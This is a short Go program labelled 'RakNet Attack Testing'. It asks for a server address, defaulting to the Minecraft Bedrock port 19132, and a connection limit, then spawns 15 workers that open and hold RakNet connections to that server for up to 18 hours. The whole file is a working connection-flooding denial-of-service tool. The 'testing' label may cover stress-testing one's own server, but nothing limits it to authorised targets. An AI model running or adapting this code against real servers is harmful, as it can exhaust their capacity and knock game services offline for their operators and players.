package main

import (
	"bufio"
	"github.com/sandertv/go-raknet"
	"github.com/sirupsen/logrus"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var mu sync.Mutex
var connId = 0
var connections = map[int]*raknet.Conn{}
var log = logrus.New()
var target string
var maxConn = 1

func main() {
	log.Formatter = &logrus.TextFormatter{ForceColors: true}

	log.Infoln("RakNet Attack Testing")

	reader := bufio.NewReader(os.Stdin)

	log.Infof("Enter Server IP: ")
	target, _ = reader.ReadString('\n')
	target = strings.ReplaceAll(target, "\r", "")
	target = strings.ReplaceAll(target, "\n", "")

	if len(strings.Split(target, ":")) == 1 {
		target += ":19132"
	}

	log.Infof("Enter Max Connections: ")
	maxStr, _ := reader.ReadString('\n')
	maxStr = strings.ReplaceAll(maxStr, "\r", "")
	maxStr = strings.ReplaceAll(maxStr, "\n", "")
	maxInt, err := strconv.Atoi(maxStr)
	if err != nil {
		log.Fatal(err)
	}
	maxConn = maxInt

	for i := 0; i < 15; i++ {
		i := i
		go func() {
			for {
				err := createConn(i)
				if err != nil {
					log.Error(err)
					continue
				}
			}
		}()
	}
	time.Sleep(time.Hour * 18)
}

func createConn(t int) error {
	for len(connections) >= maxConn {
		time.Sleep(time.Second * 5)
	}

	log.Infof("[%d] Creating connection to %s...", t, target)
	conn, err := raknet.Dial(target)
	if err != nil {
		return err
	}
	mu.Lock()
	connId++
	cId := connId
	connections[cId] = conn
	log.Infof("[%d] Created connection %s [%d]", t, conn.RemoteAddr(), len(connections))
	mu.Unlock()
	go func() {
		for {
			_, err := conn.ReadPacket()
			if err != nil {
				log.Error(err)
				_ = conn.Close()

				mu.Lock()
				delete(connections, cId)
				log.Infof("Closed %s", conn.RemoteAddr())
				mu.Unlock()
				return
			}
			time.Sleep(time.Millisecond * 100)
		}
	}()
	return nil
}
